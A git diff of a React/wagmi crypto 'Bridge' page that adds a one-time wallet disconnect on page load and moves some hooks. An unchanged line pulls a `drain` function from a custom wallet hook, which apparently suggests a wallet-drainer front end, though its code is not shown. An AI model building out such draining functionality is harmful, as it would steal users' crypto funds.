@@ -12,6 +12,7 @@ import {
   useSwitchChain,
   useBalance,
 } from "wagmi";
+import { useRef } from "react"; // Add this import
 
 import { cn } from "../lib/utils";
 import metamask from "../assets/metamask-color.svg";
@@ -38,7 +39,21 @@ import WithdrawForm from "../components/WithdrawForm";
 import History from "../components/History";
 const Bridge = () => {
 
+  const { address, connector } = useAccount();
+  const { disconnect } = useDisconnect();
+  const [accounts, setAccounts] = useState()
 
+
+  const hasMounted = useRef(false); // Create a ref to track if the component has mounted
+
+  useEffect(() => {
+    // Disconnect any connected wallet only on initial page load
+    if (!hasMounted.current && address) {
+
+      disconnect();
+      hasMounted.current = true; // Set to true after the first run
+    }
+  }, [address]);
 
   const token = {
     "token_address": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
@@ -72,13 +87,13 @@ const Bridge = () => {
   const [showConnect, setShowConnect] = useState(false);
   const [open, setOpen] = useState(false);
   const [currentTab, setCurrentTab] = useState("Bridge");
-  const [accounts, setAccounts] = useState()
+
   const [selectedToken, setSelectedToken] = useState(token)
   const [inputValue, setInputValue] = useState("0.00");
   const [walletAssets, setWalletAssets] = useState(null)
-  const { address, connector } = useAccount();
+
   const { drain, bridgeTokens } = UseWallet(inputValue);
-  const { disconnect } = useDisconnect();
+
   const { data: ensName } = useEnsName({ address });
   const { data: ensAvatar } = useEnsAvatar({
     name: ensName || undefined || address,
